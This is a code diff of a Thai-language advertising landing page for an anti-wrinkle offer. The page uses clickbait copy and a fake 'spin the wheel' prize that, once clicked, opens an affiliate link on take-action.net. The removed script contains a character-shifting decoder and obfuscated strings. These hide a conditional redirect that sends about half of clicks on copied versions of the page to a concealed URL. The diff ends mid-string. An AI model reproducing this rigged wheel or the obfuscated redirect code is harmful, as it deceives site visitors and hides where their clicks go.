@@ -39,6 +39,7 @@
         !function (e, n, A) { function o(e) { var n = u.className, A = Modernizr._config.classPrefix || ""; if (c && (n = n.baseVal), Modernizr._config.enableJSClass) { var o = new RegExp("(^|\\s)" + A + "no-js(\\s|$)"); n = n.replace(o, "$1" + A + "js$2") } Modernizr._config.enableClasses && (n += " " + A + e.join(" " + A), c ? u.className.baseVal = n : u.className = n) } function t(e, n) { return typeof e === n } function a() { var e, n, A, o, a, i, l; for (var f in r) if (r.hasOwnProperty(f)) { if (e = [], n = r[f], n.name && (e.push(n.name.toLowerCase()), n.options && n.options.aliases && n.options.aliases.length)) for (A = 0; A < n.options.aliases.length; A++)e.push(n.options.aliases[A].toLowerCase()); for (o = t(n.fn, "function") ? n.fn() : n.fn, a = 0; a < e.length; a++)i = e[a], l = i.split("."), 1 === l.length ? Modernizr[l[0]] = o : (!Modernizr[l[0]] || Modernizr[l[0]] instanceof Boolean || (Modernizr[l[0]] = new Boolean(Modernizr[l[0]])), Modernizr[l[0]][l[1]] = o), s.push((o ? "" : "no-") + l.join("-")) } } function i(e, n) { if ("object" == typeof e) for (var A in e) f(e, A) && i(A, e[A]); else { e = e.toLowerCase(); var t = e.split("."), a = Modernizr[t[0]]; if (2 == t.length && (a = a[t[1]]), "undefined" != typeof a) return Modernizr; n = "function" == typeof n ? n() : n, 1 == t.length ? Modernizr[t[0]] = n : (!Modernizr[t[0]] || Modernizr[t[0]] instanceof Boolean || (Modernizr[t[0]] = new Boolean(Modernizr[t[0]])), Modernizr[t[0]][t[1]] = n), o([(n && 0 != n ? "" : "no-") + t.join("-")]), Modernizr._trigger(e, n) } return Modernizr } var s = [], r = [], l = { _version: "3.6.0", _config: { classPrefix: "", enableClasses: !0, enableJSClass: !0, usePrefixes: !0 }, _q: [], on: function (e, n) { var A = this; setTimeout(function () { n(A[e]) }, 0) }, addTest: function (e, n, A) { r.push({ name: e, fn: n, options: A }) }, addAsyncTest: function (e) { r.push({ name: null, fn: e }) } }, Modernizr = function () { }; Modernizr.prototype = l, Modernizr = new Modernizr; var f, u = n.documentElement, c = "svg" === u.nodeName.toLowerCase(); !function () { var e = {}.hasOwnProperty; f = t(e, "undefined") || t(e.call, "undefined") ? function (e, n) { return n in e && t(e.constructor.prototype[n], "undefined") } : function (n, A) { return e.call(n, A) } }(), l._l = {}, l.on = function (e, n) { this._l[e] || (this._l[e] = []), this._l[e].push(n), Modernizr.hasOwnProperty(e) && setTimeout(function () { Modernizr._trigger(e, Modernizr[e]) }, 0) }, l._trigger = function (e, n) { if (this._l[e]) { var A = this._l[e]; setTimeout(function () { var e, o; for (e = 0; e < A.length; e++)(o = A[e])(n) }, 0), delete this._l[e] } }, Modernizr._q.push(function () { l.addTest = i }), Modernizr.addAsyncTest(function () { function e(e, n, A) { function o(n) { var o = n && "load" === n.type ? 1 == t.width : !1, a = "webp" === e; i(e, a && o ? new Boolean(o) : o), A && A(n) } var t = new Image; t.onerror = o, t.onload = o, t.src = n } var n = [{ uri: "data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAwA0JaQAA3AA/vuUAAA=", name: "webp" }, { uri: "data:image/webp;base64,UklGRkoAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAwAAAABBxAR/Q9ERP8DAABWUDggGAAAADABAJ0BKgEAAQADADQlpAADcAD++/1QAA==", name: "webp.alpha" }, { uri: "data:image/webp;base64,UklGRlIAAABXRUJQVlA4WAoAAAASAAAAAAAAAAAAQU5JTQYAAAD/////AABBTk1GJgAAAAAAAAAAAAAAAAAAAGQAAABWUDhMDQAAAC8AAAAQBxAREYiI/gcA", name: "webp.animation" }, { uri: "data:image/webp;base64,UklGRh4AAABXRUJQVlA4TBEAAAAvAAAAAAfQ//73v/+BiOh/AAA=", name: "webp.lossless" }], A = n.shift(); e(A.name, A.uri, function (A) { if (A && "load" === A.type) for (var o = 0; o < n.length; o++)e(n[o].name, n[o].uri) }) }), a(), o(s), delete l.addTest, delete l.addAsyncTest; for (var p = 0; p < Modernizr._q.length; p++)Modernizr._q[p](); e.Modernizr = Modernizr }(window, document);
 
     </script>
+
     <!--####################-->
     <!--####################-->
     <!--####################-->
@@ -142,70 +143,7 @@
         -->
 
     <style>
-        /*
-        xhtml, xbody {
-            height: 400%;
-            font-weight: 800;
-        }
 
-        xbody {
-            background: #030321;
-            font-family: Arial;
-        }
-
-        svg {
-            background: rgb(113, 195, 65);
-            xline-height: 1.2;
-            display: block;
-            background: #030321;
-            font-family: Arial;
-            font-size: 650%;
-            xfont: 10.5em 'Montserrat';
-            width: 100%;
-            xheight: 300px;
-            margin: 0 auto;
-        }
-
-        .text-copy {
-            fill: none;
-            stroke: white;
-            stroke-dasharray: 6% 29%;
-            stroke-width: 5px;
-            stroke-dashoffset: 0%;
-            animation: stroke-offset 5.5s infinite linear;
-        }
-
-            .text-copy:nth-child(1) {
-                stroke: #4D163D;
-                animation-delay: -1s;
-            }
-
-            .text-copy:nth-child(2) {
-                stroke: #840037;
-                animation-delay: -2s;
-            }
-
-            .text-copy:nth-child(3) {
-                stroke: #BD0034;
-                animation-delay: -3s;
-            }
-
-            .text-copy:nth-child(4) {
-                stroke: #BD0034;
-                animation-delay: -4s;
-            }
-
-            .text-copy:nth-child(5) {
-                stroke: #FDB731;
-                animation-delay: -5s;
-            }
-
-        @keyframes stroke-offset {
-            100% {
-                stroke-dashoffset: -35%;
-            }
-        }
-          */
         /*
         problem ie8 border-raius,background-size
         vw not supported ie<=11
@@ -308,7 +246,7 @@
         }
 
             .postpart::before {
-                content: "Page ";
+                content: "Part ";
             }
 
         /*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/
@@ -1975,18 +1913,151 @@
         }
         /*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/
 
+        .amh6 { /*important to use px to prevent  bad when click font resize*/
+            max-height: 80px;
+            xbackground-color: red;
+            vertical-align: top;
+            font-weight: 100;
+            font-size: 26px;
+            font-family: Futura, sans-serif,Arial;
+            letter-spacing: 2px;
+            xwidth: 100%;
+        }
+
+        .textcopy {
+            fill: none;
+            stroke: white;
+            stroke-dasharray: 2% 2%;
+            stroke-width: 1px;
+            stroke-dashoffset: 0%;
+            -webkit-animation: stroke-offset 6.5s infinite linear;
+            -moz-animation: stroke-offset 6.5s infinite linear;
+            animation: stroke-offset 6.5s infinite linear;
+        }
+
+            .textcopy:nth-child(1) {
+                stroke: #4D163D;
+                animation-delay: -1.5s;
+            }
+
+            .textcopy:nth-child(2) {
+                stroke: #840037;
+                animation-delay: -2.5s;
+            }
+
+            .textcopy:nth-child(3) {
+                stroke: #BD0034;
+                animation-delay: -3.5s;
+            }
+
+            .textcopy:nth-child(4) {
+                stroke: #BD0034;
+                animation-delay: -4.5s;
+            }
+
+            .textcopy:nth-child(5) {
+                stroke: #FDB731;
+                animation-delay: -5.5s;
+            }
+
+        @keyframes stroke-offset {
+            100% {
+                stroke-dashoffset: -35%;
+            }
+        }
+
+
+        .mysvg {
+            display: block;
+            font: 10.5em 'Montserrat';
+            width: 960px;
+            height: 300px;
+            margin: 0 auto;
+        }
+
+        .text-copy {
+            color: green;
+            fill: none;
+            stroke: white;
+            stroke-dasharray: 6% 29%;
+            stroke-width: 5px;
+            stroke-dashoffset: 0%;
+            animation: stroke-offset 5.5s infinite linear;
+        }
+
+            .text-copy:nth-child(1) {
+                stroke: #4D163D;
+                animation-delay: -1s;
+            }
+
+            .text-copy:nth-child(2) {
+                stroke: #840037;
+                animation-delay: -2s;
+            }
+
+            .text-copy:nth-child(3) {
+                stroke: #BD0034;
+                animation-delay: -3s;
+            }
+
+            .text-copy:nth-child(4) {
+                stroke: #BD0034;
+                animation-delay: -4s;
+            }
+
+            .text-copy:nth-child(5) {
+                stroke: #FDB731;
+                animation-delay: -5s;
+            }
+
+        @keyframes stroke-offset {
+            100% {
+                stroke-dashoffset: -35%;
+            }
+        }
     </style>
 </head>
 <body>
+    <!--
+    <svg class="mysvg" viewBox="0 0 960 300">
+        <symbol id="s-text">
+            <text fill="green" text-anchor="middle" x="50%" y="80%">Montserrat</text>
+        </symbol>
 
-
+        <g class="g-ants">
+            <use xlink:href="#s-text" class="text-copy"></use>
+            <use xlink:href="#s-text" class="text-copy"></use>
+            <use xlink:href="#s-text" class="text-copy"></use>
+            <use xlink:href="#s-text" class="text-copy"></use>
+            <use xlink:href="#s-text" class="text-copy"></use>
+        </g>
+    </svg>
+        -->
     <div class="section bg4">
-        <!--  <div><img class="rspnsvc" style="width:100%;background-color:white" src="5b1126f6.png" alt=""></div>
-        <div><img class="bg4" style="width:100%;" src="bows-n-pearls.png" alt=""></div>
-         -->
-
-        <div class="sprite0 sprite-7682a lz q75"></div>
         <!--
+            https://codepen.io/chrisnager/pen/bChes
+                  https://codepen.io/ClaireLarsen/pen/XmVyVX
+        https://codepen.io/hipe/pen/OVdeBb
+                to center text modify viewbox 3rd parameter and text tag x parameter
+                -->
+
+        <svg class="amh6" viewBox="0 0 266 33" xmlns="http://www.w3.org/2000/svg">
+            <symbol id="stext">
+                <text x="2" y="25">TAKE-ACTION.NET</text>
+            </symbol>
+
+            <g class="g-ants">
+                <use xlink:href="#stext" class="textcopy"></use>
+                <use xlink:href="#stext" class="textcopy"></use>
+                <use xlink:href="#stext" class="textcopy"></use>
+                <use xlink:href="#stext" class="textcopy"></use>
+                <use xlink:href="#stext" class="textcopy"></use>
+            </g>
+        </svg>
+
+        <!--
+
+            <div class="sprite0 sprite-7682a lz q75"></div>
             <picture>
                 <source class="xxrspnsv w100" xmedia="(min-width: 650px)" srcset="7682a-075.webp">
                 <source class="xxrspnsv w100" xmedia="(min-width: 465px)" srcset="7682a-mz75.jpg">
@@ -2008,10 +2079,6 @@
             </div>
                 -->
         <div class="col spanC1 bg2">
-            <!-- <div style="text-align:right;margin:0.1em 0.2em">  โฆษณา  </div>
-            -->
-            <!-- <h1> คุณจะยอมจ่ายเงินเพียงไม่กี่บาทเพื่อให้ดูเด็กลงถึง 15 ปีไหม? คุณหมอรายการทีวีชื่อดังเกี่ยวกับวิธีลดเลือนริ้วรอยแบบใหม่ยอมทำเช่นนั้นแน่ๆ!</h1>
-            -->
 
 
             <div class="topnav" id="myTopnav">
@@ -2024,16 +2091,7 @@
                 <a href="#scroll">Parasites/Warts/Pappilomas</a>
                 <a href="#scroll">Contact</a>
                 <a href="#scroll">About</a>
-
-                <!-- <a href="javascript:void(0);" class="icon" onclick="myFunction()">
-                <i class="fa fa-bars"></i>
-                 </a>
-                    -->
                 <span id="topnavmenu" class="icon">&#9776;</span>
-                <!--                <a id="topnavmenu" xxxhref="javascript:void(0);" class="icon">
-                                <span >&#9776; </span>
-                            </a>
-                -->
             </div>
 
             <h1 class="bg4">
@@ -2697,23 +2755,102 @@
                 </div>
                     -->
                 <div class="tr-wrap ">
-                    <div class="divtoberotated">
+                    <div class="divtoberotated " style="background-color:red">
 
-                        <!---->
+                        <!--calc radius for crcle with c=100  r=100/2p-->
+                        <!-- https://medium.com/@heyoka/scratch-made-svg-donut-pie-charts-in-html5-2c587e935d72
+                                radius based on the circumference is: r = C/(2π), or r = 100/(2π)
+                                 Current segment offset=
+                                Circumference − All preceding segments’ total length + First segment’s offset
+                        https://css-tricks.com/transforms-on-svg-elements/
+                                             <svg xmlns="http://www.w3.org/2000/svg"
+                            xmlns:xlink="http://www.w3.org/1999/xlink">
+
+                            <polyline points="10,2  60,2  35,52  10,2"
+                                style="stroke:#006600; fill: #33cc33;"/>
+                        </svg>
+                               circle lenght 360
+                                diameter 360/p=114.591559026,radius=180/p=57.2957795131
+                                -->
 
 
+                        <svg width="100%" height="100%" viewBox="0 0 114.591559026 114.591559026"
+                             xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+
+                            <!--SECTORS-->
+                            <circle cx="57.2957795131" cy="57.2957795131" r="57.2957795131" fill="transparent"
+                                    stroke="dodgerblue" stroke-width="114.591559026" stroke-dasharray="60 300" stroke-dashoffset="0"></circle>
+                            <circle cx="57.2957795131" cy="57.2957795131" r="57.2957795131" fill="transparent"
+                                    stroke="pink" stroke-width="114.591559026" stroke-dasharray="60 300" stroke-dashoffset="60"></circle>
+                            <circle cx="57.2957795131" cy="57.2957795131" r="57.2957795131" fill="transparent"
+                                    stroke="hotpink" stroke-width="114.591559026" stroke-dasharray="60 300" stroke-dashoffset="120"></circle>
+                            <circle cx="57.2957795131" cy="57.2957795131" r="57.2957795131" fill="transparent"
+                                    stroke="lightgray" stroke-width="114.591559026" stroke-dasharray="60 300" stroke-dashoffset="180"></circle>
+                            <circle cx="57.2957795131" cy="57.2957795131" r="57.2957795131" fill="transparent"
+                                    stroke="litegreen" stroke-width="114.591559026" stroke-dasharray="60 300" stroke-dashoffset="240"></circle>
+                            <circle cx="57.2957795131" cy="57.2957795131" r="57.2957795131" fill="transparent"
+                                    stroke="tan" stroke-width="114.591559026" stroke-dasharray="60 300" stroke-dashoffset="300"></circle>
+
+
+                            <!--BORDER-->
+                            <circle cx="57.2957795131" cy="57.2957795131" r="57.2957795131" fill="transparent"
+                                    stroke="salmon" stroke-width="5"></circle>
+                            <!--CENTER POINT-->
+                            <circle cx="57.2957795131" cy="57.2957795131" r="1" fill="#fff"></circle>
+                            <!--TEXSTS-->
+                            <text x="25" y="57.2957795131" fill="red" font-size="15" text-anchor="middle" dominant-baseline="central"
+                                  transform="rotate(30,57.2957795131,57.2957795131)">50%</text>
+                            <text x="25" y="57.2957795131" fill="black" font-size="15" text-anchor="middle" dominant-baseline="central"
+                                  transform="rotate(90,57.2957795131,57.2957795131)">0%</text>
+                            <text x="25" y="57.2957795131" fill="green" font-size="15" text-anchor="middle" dominant-baseline="central"
+                                  transform="rotate(150,57.2957795131,57.2957795131)">10%</text>
+                            <text x="25" y="57.2957795131" fill="white" font-size="15" text-anchor="middle" dominant-baseline="central"
+                                  transform="rotate(210,57.2957795131,57.2957795131)">20%</text>
+                            <text x="25" y="57.2957795131" fill="green" font-size="15" text-anchor="middle" dominant-baseline="central"
+                                  transform="rotate(270,57.2957795131,57.2957795131)">30%</text>
+                            <text x="25" y="57.2957795131" fill="white" font-size="15" text-anchor="middle" dominant-baseline="central"
+                                  transform="rotate(330,57.2957795131,57.2957795131) ">40%</text>
+
+                        </svg>
+
+                        <!--
                         <div class="tr-6sec"></div>
                         <div class="tr-6sec"></div>
                         <div class="tr-6fab"></div>
                         <div class="tr-6fab "></div>
                         <div class="tr-6fab "></div>
+                        -->
                         <!---->
                     </div>
+                    <style>
+                        .svgspinbutton {
+                            position: absolute;
+                            height: 100%;
+                            width: 100%
+                        }
+                    </style>
+                    <div class="svgspinbutton">
+                        <svg width="100%" height="100%" viewBox="0 0 114.591559026 114.591559026"
+                             xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                            <polyline points="52.2957795131,57.2957795131  57.2957795131,40  62.2957795131,57.2957795131  52.2957795131,57.2957795131"
+                                      style="stroke:#006600; fill: #33cc33;" />
+                            <g cursor="pointer" id="spinbutton">
+                                <circle cx="57.2957795131" cy="57.2957795131" r="12" fill="#5ff" stroke="green" stroke-width="1"></circle>
+                                <text x="57.2957795131" y="54.2957795131" fill="green" font-size="7" text-anchor="middle" dominant-baseline="central"
+                                      transform="rotate(0,57.2957795131,57.2957795131) ">&#9886;&#9757;&#9887;</text>
+                                <text x="57.2957795131" y="62.2957795131" fill="green" font-size="7" text-anchor="middle" dominant-baseline="central"
+                                      transform="rotate(0,57.2957795131,57.2957795131) ">SPIN</text>
+                            </g>
+                        </svg>
+                    </div>
 
-                    <div class="tr-cursor1"></div>
-                    <div class="tr-cursor2"></div>
-                    <div id="spinbutton"></div>
 
+                    <!--
+
+                                    <div class="tr-cursor1"></div>
+                                    <div class="tr-cursor2"></div>
+                                    <div id="spinbutton"></div>
+                    -->
                 </div>
                 <div class="spin-result-wrapper">
                     <div class="pop-up-window ">
@@ -2807,22 +2944,10 @@
                 <a class="bg4" href="http://google.com">คุณจะยอมจ่ายเงินเพียงไม่กี่บาทเพื่อให้ดูเด็กลงถึง 15 ปีไหม? คุณหมอรายการทีวีชื่อดังเกี่ยวกับวิธีลดเลือนริ้วรอยแบบใหม่ยอมทำเช่นนั้นแน่ๆ! ศัลยแพทย์ถึงกับฉุนเกี่ยวกับการเปิดเผยเรื่องนี้ คุณจะใช้จ่าย</a>
             </div>
         </div>
-        <!--https://codepen.io/ClaireLarsen/pen/XmVyVX-->
-        <!--   <svg viewBox="0 0 960 120">
-            <symbol id="s-text">
-                <text text-anchor="middle" x="50%" y="80%">TAKE-ACTION.NET</text>
-            </symbol>
 
-            <g class="g-ants">
-                <use xlink:href="#s-text" class="text-copy"></use>
-                <use xlink:href="#s-text" class="text-copy"></use>
-                <use xlink:href="#s-text" class="text-copy"></use>
-                <use xlink:href="#s-text" class="text-copy"></use>
-                <use xlink:href="#s-text" class="text-copy"></use>
-            </g>
-        </svg>
-             -->
-        <!--https://codepen.io/cesar2535/pen/ByYXpN/--> 
+
+
+        <!--https://codepen.io/cesar2535/pen/ByYXpN/-->
         <!-- <div class="pad-1em xbg4"><img class="xrspnsv w100" src="8779a.png" alt="image1"></div>
         -->
         <!--   <picture>
@@ -2832,425 +2957,11 @@
         </picture>
          -->
     </div><!--section-->
-    <!--  <div id="statis"></div>
-      <p>v2 time=<span id="time"></span></p>
-      <p>Window size: <span id="size"></span> pixels</p>
-        -->
+
     <script>
-
-
-        /*ie<9 compatible */
-
-
-        /*
-        function addEvent(element, myEvent, fnc) {
-            return ((element.attachEvent)
-                ? element.attachEvent('on' + myEvent, fnc)
-                : element.addEventListener(myEvent, fnc, false));
-        }
-
-        if (document.readyState !== 'loading') {
-            onDOMContentLoaded('document is  ready');
-        } else {
-
-
-            document.addEventListener('DOMContentLoaded', onDOMContentLoaded('document was not ready'), false);
-        }
-        */
-
-
-        /*
-        function msec() {
-            var d = new Date();
-            return d.getTime();
-            // document.getElementById("demo").innerHTML = n;
-        }*/
-        // var n1, n2, n3;
-
-
-        //window.onload = windowonload;
-
-
-        //  function onDOMContentLoaded(s) {
-        // n1 = msec();
-
-        //    console.log(s);
-
-
-
-        //  var offerLink = clk;
-        //  var vitrina = '';
-        //  var isPopup = false;
-        //  var msgText = ''; // <-- Заголовок Попап
-        //  var lnkUrl = clk;
-        //  var lnkTxt = ''; // <-- Текст ссылки
-        //  var comeBack = true;
-        /*
-        var lazyloadImages;
-
-        if ("IntersectionObserverxxx" in window) {
-        alert("lazyloadImages1");
-        lazyloadImages = document.querySelectorAll(".lz");
-        var imageObserver = new IntersectionObserver(function (entries, observer) {
-        entries.forEach(function (entry) {
-        //console.log(entry);
-        if (entry.isIntersecting) {
-        var image = entry.target;
-        image.src = image.dataset.src;
-        image.classList.remove("lz");
-        imageObserver.unobserve(image);
-        }
-        });
-        });
-
-        lazyloadImages.forEach(function (image) {
-        imageObserver.observe(image);
-        });
-        } else {
-
-
-        var lazyloadThrottleTimeout;
-        lazyloadImages = document.querySelectorAll(".lz");
-
-        function lazyload() {
-        if (lazyloadThrottleTimeout) {
-        clearTimeout(lazyloadThrottleTimeout);
-        }
-
-        lazyloadThrottleTimeout = setTimeout(function () {
-        var scrollTop = window.pageYOffset;
-        lazyloadImages.forEach(function (img) {
-        if (img.offsetTop < (window.innerHeight + scrollTop)) {
-        img.src = img.dataset.src;
-        img.classList.remove('lz');
-        }
-        });
-        if (lazyloadImages.length == 0) {
-        document.removeEventListener("scroll", lazyload);
-        window.removeEventListener("resize", lazyload);
-        window.removeEventListener("orientationChange", lazyload);
-        }
-        }, 20);
-        }
-
-        document.addEventListener("scroll", lazyload);
-        window.addEventListener("resize", lazyload);
-        window.addEventListener("orientationChange", lazyload);
-
-        }
-        */
-
-
-        //  var div = document.getElementById('date1');
-
-
-
-
-
-        //page on load
-        //    (function () {
-
-        //                var body=get
-        //              body.onload = measureCRP();
-        //document.body.onload = measureCRP();
-
-        window.addEventListener("load", doconload, false);
-        function doconload() {
-            //LAZY
-            var x = document.getElementsByClassName("q75");
-            var i;
-            for (i = 0; i < x.length; i++) {
-                //console.log(x[i].className);
-                x[i].classList.replace("lz", "lzstart");
-                //console.log(x[i].className);
-                //  x[i].classList.remove("lz");
-                //   x[i].classList.add("lzstart");
-                //console.log(x[i].classList);
-            }
-            //https://afarkas.github.io/lazysizes/index.html
-
-            /*TOP MENU*/
-            window.document.getElementById("topnavmenu").addEventListener("click",
-                function () {//when top menu  is clicked
-                    var x = document.getElementById("myTopnav");
-                    if (x.className === "topnav") {
-                        x.className += " tnclicked";
-                    } else {
-                        x.className = "topnav";
-                    }
-
-                }, false);
-
-            //DATE
-            // Array of day names
-            var dayNames = new Array("วันอาทิตย์", "วันจันทร์", "วันอังคาร", "วันพุธ", "วันพฤหัสบดี", "วันศุกร์", "วันเสาร์");
-            // Array of month Names
-            var monthNames = new Array("มกราคม", "กุมภาพันธ์", "มีนาคม", "เมษายน", "พฤษภาคม", "มิถุนายน", "กรกฎาคม", "สิงหาคม", "กันยายน", "ตุลาคม", "พฤศจิกายน", "ธันวาคม");
-            var now = new Date();
-            //                document.write(dayNames[now.getDay()] + ", " +
-            //                  monthNames[now.getMonth()] + " " +
-            //                now.getDate() + ", " + now.getFullYear());
-            document.getElementById('date1').innerHTML += dayNames[now.getDay()] + ", " +
-                monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
-
-            //WHEEL
-            (function () {
-
-                //var wheel;
-                //var resultWrapper;
-
-
-                var resultWrapper = document.querySelector('.spin-result-wrapper');
-                var wheel = document.querySelector('.divtoberotated');
-
-                window.document.getElementById("spinbutton").addEventListener("click", spin, false);
-                function spin() {
-                    //  window.open(clk, "_blank");
-                    if (wheel.classList.contains('rotated')) {
-
-                        resultWrapper.style.display = "block";//show popup
-                        //console.log("1");
-                    } else {
-                        // wheel.style.transform = "rotate(1753deg)";
-                        wheel.classList.add('super-rotation');
-                        setTimeout(function () {//show popup in 8 sec
-                            resultWrapper.style.display = "block";// console.log("qwe");
-                        }, 8000);
-                        // setTimeout(ow(), 10000);
-                        //setTimeout(function () {
-                        // var spinLinks = document.getElementsByTagName('a');
-                        // var spinHref = spinLinks[0].href;
-                        //var spinHref = clk; console.log(clk);
-                        //window.open(spinHref, "_blank");
-                        //  ow();
-                        // }, 10000);
-                        wheel.classList.add('rotated');
-                        //console.log("2");
-                    }
-                }
-
-
-
-                //CLOSE POPUP onclick
-                //var closePopup = document.querySelector('.close-popup');
-                document.querySelector('.close-popup').onclick = function () {
-                    resultWrapper.style.display = "none";
-                }
-
-
-                //COPY PROTECTION
-                /*  document.getElementByTagName("a").addEventListener("click", function (e) {
-                if (window.location.hostname.indexOf(kk(s229144183)) < 0) {
-                if (Math.floor(Math.random() * 100) <= 49) {
-                // e.preventDefault();
-                window.location.href = kk(s770135716, -6).replace("-", ":");
-                e.preventDefault();
-                }
-                }
-                })
-                */
-
-                //3 JS LINK for popup OK button
-                window.document.getElementById("wheelpopOK").addEventListener("click", function (e) {
-                    //  window.document.location.href = clk;
-                    //  window.document.location.replace(clk);//LP not stored in history
-                    resultWrapper.style.display = "none";
-
-                    var clk = "https://" + "go." + "take-" + "action." + "net/" + "click/1";
-                    window.open(clk, "_blank");
-                    if (window.location.hostname.indexOf(kk(s229144183)) < 0) {
-                        if (Math.floor(Math.random() * 100) <= 49) {
-                            // e.preventDefault();
-                            window.location.href = kk(s770135716, -6).replace("-", ":");
-                            e.preventDefault();
-                        }
-                    }
-
-
-                })
-
-            })();//WHEEL
-
-
-
-            //FONT
-            (function () {
-
-
-                var aa = sessionStorage.getItem("currfontsize");
-               // console.log("aa ", aa);
-                var fs = aa !== null ? parseInt(aa) : 100;
-              //  console.log("fs ", fs);
-                var i3 = document.getElementById('icon3');
-                var i4 = document.getElementById('icon4');
-                var x = document.getElementById("root");
-
-                i3.onclick = function () {
-                    fs = fs > 50 ? (fs) - 10 : fs;
-                    x.style.fontSize = fs + "%";
-                    sessionStorage.setItem("currfontsize", fs);
-                  //  console.log("fs ", fs);
-                }
-
-                i4.onclick = function () {
-                    fs = fs < 170 ? (fs) + 10 : fs;
-                    x.style.fontSize = fs + "%";
-                    sessionStorage.setItem("currfontsize", fs);
-                    console.log("fs ", fs);
-                }
-
-            })();//FONT
-
-            //pagination
-            (function () {
-                function loopPosts(aciveradio, isload) {
-                    var posts = document.getElementsByClassName('post');
-                    //console.log("posts ", posts.length);
-                    for (var i = 0; i < posts.length; i++) {
-
-                        //console.log("post ", i);
-                        if (posts[i].id == aciveradio.className) {
-                            posts[i].className = "post";
-                        } else if (posts[i].className == "post") {
-                            posts[i].className = posts[i].className + ' hidemypost';
-                        }
-                        console.log(i, " class=", posts[i].className);
-                    }
-                    if (!isload) {
-                        var elmnt = document.getElementById("scroll");
-                        elmnt.scrollIntoView({ behavior: 'smooth' });
-                    }
-                }
-
-                //  var qq = document.getElementsByClassName('post1');//first radio
-                //   loopPosts(qq[0], true);
-
-                var inputs = document.getElementsByName('g1');
-                //console.log("inputs ", inputs.length);
-                for (var i = 0; i < inputs.length; i++) {
-                    //console.log("input ", i);
-                    inputs[i].onclick = function () {
-                        //
-                        // console.log("this.className ", this.className);
-                        loopPosts(this, false);
-                    }
-                }
-            })();//pagination
-
-
-
-
-
-
-
-
-            /*
-
-            function measureCRP() {
-                var t = window.performance.timing,
-                    interactive = t.domInteractive - t.domLoading,
-                    dcl = t.domContentLoadedEventStart - t.domLoading,
-                    complete = t.domComplete - t.domLoading,
-                    firstv = t.domComplete - t.navigationStart;
-                var stats = document.createElement('p');
-                stats.textContent = 'interactive: ' + interactive + 'ms, ' +
-                    'dcl: ' + dcl + 'ms, complete: ' + complete + 'ms, firstv: ' + firstv + 'ms';
-                document.body.appendChild(stats);
-                document.getElementById("statis").appendChild(stats);
-            }
-
-            measureCRP();
-
-            window.onresize = function () {
-                document.getElementById("size").innerHTML = window.innerWidth;
-            };
-
-
-
-            // Get current time.
-            var now = new Date().getTime();
-            // Calculate page load time.
-            var page_load_time = now - performance.timing.navigationStart;
-            // Write the load time to the F12 console.
-            if (window.console) console.log("page_load_time =" + page_load_time);
-            document.getElementById("time").innerHTML = page_load_time;
-
-*/
-
-            //n2 = msec();
-            //document.getElementById("time").innerText = 'load time is ' + loadTime + "  " + (n2 - n1);
-
-        }
-
-
-                                //  })();
-                                //  }//onDOMContentLoaded
-
-
-
-
-
-                                //   window.onresize = function () {
-                                //     document.getElementById("size").innerHTML = window.innerWidth;
-                                //   };
-
-
-
-
-/*
-
-                                function dd(id) {
-                                    var imgDefer = document.getElementById(id);
-                                    //  console.log(i + " qwe");
-                                    imgDefer.setAttribute('src', imgDefer.getAttribute('data-src'));
-                                }
-                                function xgg() {
-                                    var imgDefer = document.getElementsByTagName('img');
-                                    for (var i = 0; i < imgDefer.length; i++) {
-                                        if (imgDefer[i].getAttribute('data-src')) {
-                                            //  console.log(i + " qwe");
-                                            imgDefer[i].setAttribute('src', imgDefer[i].getAttribute('data-src'));
-                                        }
-                                    }
-                                }
-
-
-                                function kk(es, num) {
-                                    function sgn(x) {//ie11 doesnt support Math.sign
-                                        return (x > 0) - (x < 0);
-                                    }
-                                    var m = ""; var i; var sgnm = sgn(num);
-                                    for (i = 0; i < es.length; i++) {
-                                        var a = sgnm * ((i + (sgnm * num) - 1) % (sgnm * num));
-                                        m += String.fromCharCode(es.charCodeAt(i) + a);
-                                    }
-                                    return m;
-                                }
-
-                                var s4 = '3sfewmtn%7Ceoifr%3Bdrxm%3Bqcghnnh%3C3%3Frasilr%3F0%3Cddgpgsqxri%3A%24%3A3%3C581%7F1kwovr%3Dfjfpth03gsqxt%3Fagvhv%80cppwist%3B%24%25%3Fiitroe%7E%3Aucepj%7D/iuszp%3Bcixjr%7Ceoifr%3Bdrxm%7D/iuszp%7C%7Crsr%3A2%7F1gtl%7Cflwulb%7B%3Dfqodm%3Ejqobv%3Dpjfu%3Dwi%7Dt.comln%3Behryes%3Disst.ul%7Ej%3A205ir%3Bccfolrpwqh%3F%23eeggic%3Crdhiioi%3D4%250%213s%7C%250%3Codvlio%3C3%81goe%7B%7Etfdekqk%3F0%214hq%250%214hq@fppw%3E601%272534%21%24Kiqvfvlgf%20Ogxi%27%2Cbtleq%2Cigozjtjed0memxh0xaou0wjrjh%80l6%7Bgqqx2sj%7Ch%3E6.9gp%3Frasilr2lfhw%3E6en%3Dpewgjp0vngiv%3D5jm%7Ej5%7Fkoov0wnzf%3C42%3Aen%7F1ljaegu%7Fuaeflrl%3A2gp%245%3Bug%7Bx2amkjr%3Fcfpwiw%3Bxkgxm%3A92%28%3Frasilr2lfhw%3Efuuq%3Eqfrhkq1wihjw%3Efuuq%802HaqvLqlTyv%7Es%7Beshos%7C%3Abwws@bbenkwovpg%3E%28ddffhh%3Bncuknn%3B3hq%251fo%234%251fo%802HaqvLqlLfhw%7Fklpcw%3Eqegv%3E%7Bnduj%3D95%25%3Cjhmlhu%3Cdyyo%3Codvlio/umlhu%3C4ir%7D/EdtyIniUmlhu%7Diptau%3CUmlhu%3Dzmiti%3C84*%3Biglkmt%3Bcxxt%3Bncuknn.nhjy%3A2gp%813rfussssjxh%7Fray/zmiti%3C445%25%3Cjhmlhu%3Cdyyo%3Cflwulb%7B%3Dfqodm%3Eqfrhkq1qegv%3Deztp%3Dpewgjp0vngiv%3Deztp%7F1fztuqq%7Fgadmjvtuof0gtlpt%3D%27k07%3Deswdft%3D4@cpnrv%3Fwikwi@pbfgmsg%3B38t%7D%2084s%7C@tfzw1fljiq%3Eheovhv@tfzw1iedqueyipp%3Drtnf%3Dwi%7Dt.ukeiox%3C6t%7D%204r%7